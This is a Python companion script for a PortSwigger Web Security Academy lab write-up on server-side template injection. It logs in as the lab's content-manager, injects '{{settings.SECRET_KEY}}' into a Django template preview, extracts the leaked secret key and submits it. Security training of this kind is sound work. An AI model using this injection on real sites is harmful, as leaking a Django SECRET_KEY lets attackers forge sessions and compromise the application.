#!/usr/bin/env python3
"""
Server-side template injection with information disclosure via user-supplied objects
PortSwigger Web Security Academy -- Server-Side Template Injection

Companion script for the writeup: 05-ssti-with-information-disclosure-via-user-supplied-objects.md

What this does:
    Logs in as content-manager and submits `{{settings.SECRET_KEY}}` directly
    through the template preview endpoint -- skipping the `{% debug %}`
    context-enumeration step PortSwigger's walkthrough uses to discover that
    `settings` is reachable, since this technique was already recorded in our
    capability notes from prior work. Parses the leaked key out of the
    preview-result element and submits it to the lab's solution endpoint.

Usage:
    python 05-ssti-with-information-disclosure-via-user-supplied-objects.py <lab-url>
    e.g. python 05-ssti-with-information-disclosure-via-user-supplied-objects.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

TEMPLATE_URL = "/product/template?productId=1"


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url, follow_redirects=True, timeout=15)
    match = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not match:
        match = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return match.group(1) if match else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Logging in as content-manager")
    csrf = _get_csrf(client, f"{lab_url}/login")
    client.post(f"{lab_url}/login",
                data={"csrf": csrf, "username": "content-manager", "password": "C0nt3ntM4n4g3r"})
    print("[+] Logged in.")

    tpl_url = f"{lab_url}{TEMPLATE_URL}"

    print("[*] Injecting {{settings.SECRET_KEY}} into template preview")
    tpl_csrf = _get_csrf(client, tpl_url)
    resp = client.post(tpl_url, data={
        "csrf": tpl_csrf, "template": "{{settings.SECRET_KEY}}", "template-action": "preview",
    })

    match = re.search(r"id=preview-result>\s*\n?\s*([a-z0-9]{20,})", resp.text)
    if not match:
        print("[-] Could not extract SECRET_KEY from the preview response.")
        return
    secret_key = match.group(1)
    print(f"[+] SECRET_KEY: {secret_key}")

    print("[*] Submitting secret key to /submitSolution")
    client.post(f"{lab_url}/submitSolution", data={"answer": secret_key})

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- Django SECRET_KEY leaked and submitted.")
    else:
        print("[-] Not solved yet -- inspect the response manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
